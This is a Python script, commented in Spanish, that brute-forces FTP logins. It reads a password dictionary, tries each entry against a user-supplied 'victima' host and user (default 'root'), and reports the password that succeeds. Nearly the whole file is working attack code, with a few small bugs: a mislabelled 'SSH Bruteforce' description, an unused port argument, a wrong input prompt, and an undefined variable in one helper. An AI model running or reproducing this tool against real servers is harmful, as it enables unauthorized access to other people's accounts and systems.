#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                        ATAQUE POR FUERZA BRUTA A FTP


"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
from ftplib import FTP, error_perm
import socket
import argparse
from termcolor import colored
import sys

"""
Definimos la funcion para el ataque por fuerza bruta
"""


def ataque_bruteforce(victima,usuario,puerto,diccionario):
    #Leemos el diccionario con las contraseñas que iremos probando
    try:
        dic = open(diccionario, "r")
        for contrasenia in dic:
            contrasenia = contrasenia[:-1]
            # Establecemos la conexion con FTP
            try:
                conexion_ftp = FTP(victima)  # connect to host, default port
                conexion_ftp.login(usuario, contrasenia)  # user anonymous, passwd anonymous@
                conexion_ftp.retrlines('LIST')
                print(colored('Ftp server connected using the provided username "', 'yellow') + usuario +
                      colored('" and  password "', 'yellow') + contrasenia + '"')
                print(colored("[+] Contraseña encontrada: %s", 'green', attrs=['blink']) %contrasenia)
                conexion_ftp.quit()
                break

            # No funciona la contraseña que hemos probado
            except error_perm:
                print(colored("[-] Contraeña o usuario erroneos: %s", 'red') %contrasenia)

            # Excepcion en caso de que no haya conexion
            except socket.error:
                print(colored("[-] Fallo al establecer la conexión", 'magenta'))
                break

    except IOError:
        print("[-] %s diccionario no encontrado " %diccionario)


def entrada_ip():
    try:
        # Capturamos la direccion del host a analizar
        ip_destino = input(colored(texto, 'blue'))
        # Si no hay contenido, analizaremos localhost
        if ip_destino == "":
            ip_destino = '127.0.0.1'
        return ip_destino

    except Exception as e:
        print(colored('Error en la direccion introducida. %s' %e, 'red'))


def main():
    print(colored("\n#######################################################################", 'green', attrs=['bold']))
    print(colored("\n         Ataque por fuerza bruta a Servidor FTP\n", 'blue', attrs=['bold']))
    print(colored("#######################################################################\n", 'green', attrs=['bold']))

    parser = argparse.ArgumentParser(description="SSH Bruteforce")
    parser.add_argument("-v", "--victima", dest="victima", type=str,help="Victima para hacer el ataque por fuerza bruta", metavar="IP/URL")
    parser.add_argument("-u", "--usuario", dest="usuario", type=str, help="Usuario para el que se probará el ataque por fuerza bruta", metavar="USERNAME",default="root")
    parser.add_argument("-p","--puerto", dest="puerto", type=int, help="Puerto para el que se probará el ataque por fuerza bruta", metavar="PUERTO", default=22)
    parser.add_argument("-d", "--diccionario", dest="diccionario", type=str, help="Diccionario para probar el ataque por fuerza bruta", metavar="DICCIONARIO")

    args = parser.parse_args()

    if args.victima and args.diccionario:
        ataque_bruteforce(args.victima, args.usuario, args.puerto, args.diccionario)
    else:
        parser.print_help()
        print("")
        print(colored("No se han pasado recibido los argumentos necesarios. . .", 'green', attrs=['blink']))
        print("")
        while True:  # Hacemo un bucle hasta que se introduza la direccion del Host
            victima = input(colored("Introduzca la direccion de la victima: ", 'cyan'))
            if victima != "":  # Si se introduce un dato paramos el bucle
                break  # Paramos el bucle

        usuario = input(colored("Introduzca el nombre de usuario: ", 'cyan'))
        puerto = input(colored("Introduzca el numero del puerto, pulsa INTRO para usar default (21): ", 'cyan'))

        if puerto == "":
            puerto = '21'

        diccionario = input(colored("Introduzca el numero del puerto, pulsa INTRO para usar default (diccionario_ftp) : ", 'cyan'))
        if diccionario == "":
            diccionario = 'diccionario_ftp'

        ataque_bruteforce(victima, usuario, puerto, diccionario)

    repite_consulta = input(colored("\nDesea repetir la consulta? (s/n): ", 'magenta', attrs=['bold']))
    if repite_consulta == 'n':
        sys.exit(1)
    else:
        main()


"""
Programa principal
"""
if __name__ == "__main__":
    main()
